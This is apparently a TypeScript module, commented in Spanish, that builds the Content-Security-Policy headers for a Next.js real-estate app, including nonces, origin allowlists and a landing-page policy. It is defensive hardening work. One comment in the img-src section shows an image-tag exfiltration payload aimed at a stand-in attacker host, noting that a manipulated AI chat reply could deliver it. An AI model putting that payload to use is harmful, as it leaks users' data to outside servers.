/**
 * La política de contenido (CSP) del front, en UN solo lugar.
 *
 * ── Por qué existe (endurecimiento del navegador, 23-09) ──────────────────
 * Hasta hoy la CSP vivía en `next.config.mjs`, en modo Report-Only y SIN
 * destino: no bloqueaba nada y los reportes no llegaban a ningún lado. Y aun
 * si se hubiera vuelto obligatoria, no protegía: `script-src 'unsafe-inline'
 * 'unsafe-eval'` deja correr cualquier `<script>` que un XSS logre meter en la
 * página, y `connect-src https:` le deja mandar lo robado a cualquier servidor.
 * En esta app eso es grave: la sesión de Supabase vive en cookies que
 * JavaScript puede leer (pasarla a HttpOnly es un cambio aparte), así que un solo XSS se
 * lleva la sesión de quien mueve la plata de los propietarios.
 *
 * ── Qué cambia ────────────────────────────────────────────────────────────
 *   - Scripts por NONCE (uno nuevo por petición, lo pone `middleware.ts`) +
 *     `'strict-dynamic'`: corre lo que Next marcó con el nonce y lo que ESOS
 *     scripts carguen (los chunks, Tally al hacer clic). Un `<script>` inyectado
 *     no trae el nonce y no corre. `'unsafe-inline'` y `https:` quedan sólo como
 *     respaldo para navegadores viejos que no entienden nonces: los modernos
 *     los IGNORAN cuando hay nonce/`strict-dynamic` (CSP3).
 *   - Sin `'unsafe-eval'` en producción. En desarrollo sí: React lo usa para
 *     reconstruir las pilas de error y Next para el recargado en caliente.
 *   - `connect-src` con la lista CERRADA de orígenes a los que el front habla
 *     (sale de las mismas variables de entorno que usa el código, así que un
 *     back en otro dominio no exige tocar este archivo).
 *   - `frame-ancestors 'self'`: nadie de afuera nos enmarca (clickjacking en
 *     pantallas que aprueban giros). `'self'` y no `'none'` porque los visores
 *     de PDF son `<iframe>` de `blob:`/URLs firmadas creados por nuestras
 *     propias páginas; ver `cabeceras-de-seguridad.test.ts`.
 *
 * ── Cómo se mantiene ──────────────────────────────────────────────────────
 * Si una pantalla nueva necesita un origen, se agrega ACÁ (con el porqué) y la
 * prueba `politica-de-contenido.test.ts` lo fija. Los reportes de violación
 * llegan a `/api/csp-reporte` (con límite de intentos) y se ven en el log del
 * servidor: antes de pasar a obligatoria en producción, ese log tiene que
 * estar limpio una semana.
 */

import { hostDeAssets } from './hosts-de-almacenamiento';
import { HOSTS_S3_DATA } from './buckets-s3.data.mjs';

/** Ruta que recibe los reportes de violación (`src/app/api/csp-reporte`). */
export const RUTA_DE_REPORTES_CSP = '/api/csp-reporte';

/** Nombre del grupo de `Reporting-Endpoints` / `report-to`. */
export const GRUPO_DE_REPORTES_CSP = 'csp';

/** Cabecera interna por la que el middleware le pasa el nonce al layout. */
export const CABECERA_DEL_NONCE = 'x-nonce';

/**
 * Orígenes de terceros que el front usa desde el navegador. Cada uno con el
 * porqué: el día que se deje de usar, se borra.
 */
export const TERCEROS = {
  /** Estilos y teselas del mapa (MapLibre + OpenFreeMap, sin llave). */
  mapa: 'https://tiles.openfreemap.org',
  /**
   * Wompi: el checkout alojado se abre en pestaña/iframe, y la tokenización
   * de la tarjeta del autopago (`autopago.service.ts`) llama a su API desde el
   * navegador (sandbox en dev, production en producción).
   */
  wompiCheckout: 'https://checkout.wompi.co',
  wompiApi: ['https://production.wompi.co', 'https://sandbox.wompi.co'],
  /** Formulario de comentarios (`FeedbackCta`): script al hacer clic + iframe. */
  tally: 'https://tally.so',
  /**
   * Notificaciones push (Firebase Cloud Messaging): el SDK registra el
   * dispositivo contra estas APIs de Google.
   */
  firebase: [
    'https://firebaseinstallations.googleapis.com',
    'https://fcmregistrations.googleapis.com',
    'https://fcm.googleapis.com',
  ],
  /** Fotos de perfil de quien entra con Google. */
  fotosDeGoogle: 'https://lh3.googleusercontent.com',
  /** Fotos de stock de la landing y de las páginas «Para …». */
  fotosDeLaLanding: ['https://images.unsplash.com', 'https://images.pexels.com'],
  /**
   * El reproductor de los videos de los inmuebles (marketplace, 09-10-2026):
   * el modal es nuestro y adentro va el reproductor OFICIAL de cada red
   * (`lib/marketplace/video.ts`). Sin estos orígenes, el día que la política
   * pase a obligatoria el video queda en blanco.
   */
  reproductoresDeVideo: [
    'https://www.youtube-nocookie.com',
    'https://www.tiktok.com',
    'https://www.instagram.com',
    'https://www.facebook.com',
  ],
  /**
   * Las portadas de esos videos: la de YouTube sale de su id y la de TikTok
   * de su oEmbed (`use-portada-del-video.ts`), que se pide a www.tiktok.com.
   */
  portadasDeVideo: ['https://i.ytimg.com', 'https://*.tiktokcdn.com', 'https://*.tiktokcdn-us.com'],
  oembedDeTiktok: 'https://www.tiktok.com',
} as const;

/**
 * Buckets S3 privados del almacenamiento nuevo (T-0182), por origen EXACTO (CSP
 * sólo admite comodín en la primera etiqueta, y `*.amazonaws.com` abriría
 * cualquier bucket del mundo). Se bajan con URLs firmadas: `files` (documentos,
 * visores de PDF, PUT firmado desde el navegador) y `avaluo` (fotos del avalúo).
 * El bucket público no se expone directo: va por CloudFront (`NEXT_PUBLIC_ASSETS_HOST`).
 */
export const BUCKETS_S3: readonly string[] = HOSTS_S3_DATA.map((h) => `https://${h}`);

export type ModoDeLaPolitica = 'obligatoria' | 'reporte';

export interface EntornoDeLaPolitica {
  /** `true` con `next dev`: agrega lo que el recargado en caliente necesita. */
  desarrollo: boolean;
  /**
   * `true` cuando la política va en `Content-Security-Policy-Report-Only`. Ahí
   * `upgrade-insecure-requests` no aplica: el navegador la ignora y lo avisa
   * como ERROR en la consola de cada página (QA-INQ, 03-10). Sólo va en la
   * política obligatoria.
   */
  soloReporte?: boolean;
  NEXT_PUBLIC_SUPABASE_URL?: string;
  /** Hostname of the CloudFront public-assets distribution (empty = not configured). */
  NEXT_PUBLIC_ASSETS_HOST?: string;
  NEXT_PUBLIC_BACKEND_URL?: string;
  NEXT_PUBLIC_AGENT_URL?: string;
  NEXT_PUBLIC_AVALUO_API_URL?: string;
  NEXT_PUBLIC_ADMIN_API_URL?: string;
  NEXT_PUBLIC_AI_API_URL?: string;
}

/** El origen (`esquema://host[:puerto]`) de una URL, o `null` si no es http(s). */
export function origenDe(url: string | undefined): string | null {
  if (!url) return null;
  try {
    const u = new URL(url.trim());
    if (u.protocol !== 'https:' && u.protocol !== 'http:') return null;
    return u.origin;
  } catch {
    return null;
  }
}

/** `https://x` → `wss://x` (Realtime de Supabase va por WebSocket). */
function comoWebSocket(origen: string): string {
  return origen.replace(/^http/, 'ws');
}

function sinRepetidos(lista: Array<string | null | undefined>): string[] {
  return [...new Set(lista.filter((x): x is string => Boolean(x)))];
}

/**
 * Los backends propios a los que el navegador llama directo (`fetch` con
 * Bearer). Salen de las mismas variables que usa `src/lib/api/**`.
 */
export function backendsPropios(env: EntornoDeLaPolitica): string[] {
  return sinRepetidos([
    origenDe(env.NEXT_PUBLIC_BACKEND_URL),
    origenDe(env.NEXT_PUBLIC_AGENT_URL),
    origenDe(env.NEXT_PUBLIC_AVALUO_API_URL),
    origenDe(env.NEXT_PUBLIC_ADMIN_API_URL),
    origenDe(env.NEXT_PUBLIC_AI_API_URL),
  ]);
}

/**
 * Arma la CSP. Pura: mismo entorno + mismo nonce = misma cadena. El nonce lo
 * genera `nuevoNonce()` por petición; sin nonce (no debería pasar) la política
 * sigue siendo válida pero sin la excepción, así que Next no podría hidratar:
 * se nota enseguida en vez de pasar en silencio.
 */
export function politicaDeContenido(nonce: string | null, env: EntornoDeLaPolitica): string {
  const supabase = origenDe(env.NEXT_PUBLIC_SUPABASE_URL);
  const propios = backendsPropios(env);
  const assets = hostDeAssets(env.NEXT_PUBLIC_ASSETS_HOST);
  const cloudfront = assets ? `https://${assets}` : null;

  const script = sinRepetidos([
    "'self'",
    nonce ? `'nonce-${nonce}'` : null,
    "'strict-dynamic'",
    // Los reportes traen los primeros 40 caracteres del script bloqueado:
    // sin eso, un reporte de «inline» no dice QUÉ se bloqueó.
    "'report-sample'",
    // Respaldo para navegadores sin CSP3: los modernos ignoran estos dos
    // cuando hay nonce + strict-dynamic.
    "'unsafe-inline'",
    'https:',
    env.desarrollo ? "'unsafe-eval'" : null,
  ]);

  const connect = sinRepetidos([
    "'self'",
    ...propios,
    supabase,
    supabase ? comoWebSocket(supabase) : null,
    // Browser presigned PUT (T-0182).
    ...BUCKETS_S3,
    TERCEROS.mapa,
    ...TERCEROS.wompiApi,
    ...TERCEROS.firebase,
    TERCEROS.oembedDeTiktok,
    // El recargado en caliente de `next dev` abre un WebSocket al mismo host.
    env.desarrollo ? 'ws:' : null,
  ]);

  // Imágenes: la lista CERRADA de orígenes que el producto usa de verdad
  // (medido el 23-09 en la base de dev: las fotos de inmuebles, actas, PQRS,
  // logos y avatares son rutas de Supabase Storage o fotos de Google; lo demás
  // es la landing). Cerrarla importa porque una imagen es el canal de fuga
  // más barato: `<img src="https://atacante/x?d=<datos>">` sale sin clic y sin
  // JavaScript —por ejemplo desde una respuesta del chat de IA manipulada—.
  // `next/image` sirve desde `/_next/image` (nuestro origen) y las fotos de
  // portales importados pasan por `/api/inmuebles/imagen-remota` (también).
  const img = sinRepetidos([
    "'self'",
    'data:',
    'blob:',
    supabase,
    cloudfront,
    ...BUCKETS_S3,
    ...propios,
    TERCEROS.mapa,
    TERCEROS.fotosDeGoogle,
    ...TERCEROS.fotosDeLaLanding,
    ...TERCEROS.portadasDeVideo,
  ]);

  const frame = sinRepetidos([
    "'self'",
    // Visores de PDF: `blob:` (bytes bajados con Bearer) y URLs firmadas de
    // Supabase Storage.
    'blob:',
    'data:',
    supabase,
    ...BUCKETS_S3,
    ...propios,
    TERCEROS.wompiCheckout,
    TERCEROS.tally,
    ...TERCEROS.reproductoresDeVideo,
  ]);

  const directivas: Array<[string, string[]]> = [
    ['default-src', ["'self'"]],
    ['script-src', script],
    // `'unsafe-inline'` en estilos: los usan Radix, framer-motion y los
    // `style={{…}}` de React. Un estilo inyectado no ejecuta código; el costo
    // de nonces en estilos (reescribir cada librería) no se justifica.
    ['style-src', ["'self'", "'unsafe-inline'"]],
    // `next/font` sirve las fuentes de Google desde NUESTRO origen.
    ['font-src', ["'self'", 'data:']],
    ['img-src', img],
    // Audio/video: las grabaciones de llamadas llegan como `blob:` (bytes
    // bajados con Bearer); el backoffice reproduce la URL que da el proveedor
    // de voz, cuyo dominio no controlamos, y por eso queda `https:`.
    ['media-src', sinRepetidos(["'self'", 'blob:', 'data:', 'https:'])],
    ['connect-src', connect],
    // MapLibre corre su worker desde `public/maplibre/` (mismo origen); las
    // librerías que arman workers en memoria usan `blob:`.
    ['worker-src', ["'self'", 'blob:']],
    ['frame-src', frame],
    ['frame-ancestors', ["'self'"]],
    ['object-src', ["'none'"]],
    ['base-uri', ["'self'"]],
    // El checkout de Wompi es un enlace/`window.open`, no un <form>: con
    // `'self'` alcanza.
    ['form-action', ["'self'"]],
    ['manifest-src', ["'self'"]],
  ];

  const partes = directivas.map(([nombre, valores]) => `${nombre} ${valores.join(' ')}`);
  if (!env.desarrollo && !env.soloReporte) partes.push('upgrade-insecure-requests');
  partes.push(`report-uri ${RUTA_DE_REPORTES_CSP}`);
  partes.push(`report-to ${GRUPO_DE_REPORTES_CSP}`);
  return partes.join('; ');
}

/**
 * La HOME (Ronda 30, Nico 23-10-2026: «la de producto en vivo debe ser la
 * landing principal»). Es una página HTML estática, `public/landing/index.html`,
 * que no arma React: no lleva nonce. Sus scripts son archivos nuestros
 * (`/landing/js/*`, mismo origen) más las librerías de animación con versión
 * FIJA de dos CDN (GSAP y ScrollTrigger de cdnjs; Lenis y Motion de jsDelivr),
 * y las letras (Host Grotesk, DM Mono) vienen de Google Fonts. Esta política
 * abre SÓLO eso —las carpetas exactas de esas versiones, no los CDN enteros— y
 * SÓLO para la home: el resto del sitio sigue con la de nonce. No habla con
 * ningún back (`connect-src 'self'`), no enmarca nada y sus imágenes son propias.
 */
export const RUTA_DE_LA_HOME = '/landing/index.html';

export const TERCEROS_DE_LA_HOME = {
  scripts: [
    'https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/',
    'https://cdn.jsdelivr.net/npm/lenis@1.1.13/',
    'https://cdn.jsdelivr.net/npm/motion@12.23.12/',
  ],
  estilos: ['https://fonts.googleapis.com'],
  letras: ['https://fonts.gstatic.com'],
} as const;

/**
 * Las INTERNAS de la home (Ronda 30): las páginas a las que lleva el mega menú
 * «Producto» — las ocho de producto (y su índice, `/productos`) y las cuatro por
 * público. Son páginas estáticas como la home (`public/internas/…`, sin React),
 * con las MISMAS librerías y letras: llevan la política de la home y nada más.
 */
export const PRODUCTOS_DE_LAS_INTERNAS = ['crm', 'erp', 'cobranza', 'inquilino', 'avaluos', 'conciliacion', 'matching', 'asegurabilidad'] as const;
export const PUBLICOS_DE_LAS_INTERNAS = ['inmobiliarias', 'propietarios', 'inquilinos', 'agentes'] as const;
export const RUTAS_DE_LAS_INTERNAS = {
  productos: '/internas/productos/index.html',
  para: '/internas/para/index.html',
} as const;

/** La página estática que sirve esta ruta (sin prefijo de idioma), o `null` si no es una interna. */
export function internaDeLaRuta(ruta: string): string | null {
  if (ruta === '/productos') return RUTAS_DE_LAS_INTERNAS.productos;
  const m = /^\/(productos|para)\/([a-z]+)$/.exec(ruta);
  if (!m) return null;
  if (m[1] === 'productos') return (PRODUCTOS_DE_LAS_INTERNAS as readonly string[]).includes(m[2]) ? RUTAS_DE_LAS_INTERNAS.productos : null;
  return (PUBLICOS_DE_LAS_INTERNAS as readonly string[]).includes(m[2]) ? RUTAS_DE_LAS_INTERNAS.para : null;
}

/**
 * La página YA ARMADA para buscadores que sirve esta ruta en este idioma (SEO, Nico 24-10-2026: «optimiza toda la
 * landing para SEO, para que podamos aparecer en todo lado»): `public/paginas/<idioma>/…`, una por dirección, con su
 * título, canonical, hreflang, JSON-LD, el contenido de su vista y el inglés en el HTML. La arma
 * `scripts/landing/armar-paginas.mjs` desde las fuentes de arriba; `null` si la ruta no es de la landing estática.
 */
export function paginaArmada(ruta: string, idioma: 'es' | 'en'): string | null {
  if (ruta === '/' || ruta === '') return `/paginas/${idioma}/index.html`;
  if (internaDeLaRuta(ruta) === null) return null;
  if (ruta === '/productos') return `/paginas/${idioma}/productos/index.html`;
  return `/paginas/${idioma}${ruta}.html`;
}

/** ¿Esta ruta (sin prefijo de idioma) es la home, una de sus internas o un archivo de ellas? */
export function esDeLaHome(ruta: string): boolean {
  return ruta === '/' || ruta === '' || ruta.startsWith('/landing/') || ruta.startsWith('/internas/') || ruta.startsWith('/paginas/') || internaDeLaRuta(ruta) !== null;
}

export function politicaDeLaHome(env: Pick<EntornoDeLaPolitica, 'desarrollo' | 'soloReporte'>): string {
  const directivas: Array<[string, string[]]> = [
    ['default-src', ["'self'"]],
    ['script-src', ["'self'", ...TERCEROS_DE_LA_HOME.scripts, "'report-sample'"]],
    // Los `style="…"` del marcado; un estilo no ejecuta código (igual que en el resto).
    ['style-src', ["'self'", "'unsafe-inline'", ...TERCEROS_DE_LA_HOME.estilos]],
    ['font-src', ["'self'", 'data:', ...TERCEROS_DE_LA_HOME.letras]],
    ['img-src', ["'self'", 'data:', 'blob:']],
    ['media-src', ["'self'"]],
    ['connect-src', ["'self'"]],
    ['worker-src', ["'self'", 'blob:']],
    ['frame-src', ["'none'"]],
    ['frame-ancestors', ["'self'"]],
    ['object-src', ["'none'"]],
    ['base-uri', ["'self'"]],
    ['form-action', ["'self'"]],
    ['manifest-src', ["'self'"]],
  ];
  const partes = directivas.map(([nombre, valores]) => `${nombre} ${valores.join(' ')}`);
  if (!env.desarrollo && !env.soloReporte) partes.push('upgrade-insecure-requests');
  partes.push(`report-uri ${RUTA_DE_REPORTES_CSP}`);
  partes.push(`report-to ${GRUPO_DE_REPORTES_CSP}`);
  return partes.join('; ');
}

/**
 * ¿Obligatoria o sólo reporte? Por defecto REPORTE: pasar a obligatoria es una
 * decisión que se toma mirando `/api/csp-reporte` limpio, no un efecto
 * colateral de un despliegue. `CSP_MODO=obligatoria` la activa.
 */
export function modoDeLaPolitica(valor: string | undefined): ModoDeLaPolitica {
  return valor?.trim().toLowerCase() === 'obligatoria' ? 'obligatoria' : 'reporte';
}

export function cabeceraDeLaPolitica(modo: ModoDeLaPolitica): string {
  return modo === 'obligatoria'
    ? 'Content-Security-Policy'
    : 'Content-Security-Policy-Report-Only';
}

/** 128 bits aleatorios en base64 (Web Crypto: corre en el runtime Edge). */
export function nuevoNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  let binario = '';
  for (const b of bytes) binario += String.fromCharCode(b);
  return btoa(binario);
}

/**
 * Rutas que NO llevan la CSP de documento: los scripts de service worker y el
 * worker del mapa. Un worker se rige por la CSP de SU respuesta, y con
 * `'strict-dynamic'` el `importScripts` de Firebase (gstatic.com) quedaría
 * bloqueado: las notificaciones push dejarían de llegar sin un solo error
 * visible en la pantalla.
 */
export const RUTAS_SIN_POLITICA_DE_DOCUMENTO = [
  /^\/firebase-messaging-sw\.js$/,
  /^\/sw-inventario\.js$/,
  /^\/maplibre\//,
] as const;

export function llevaPoliticaDeDocumento(ruta: string): boolean {
  return !RUTAS_SIN_POLITICA_DE_DOCUMENTO.some((re) => re.test(ruta));
}
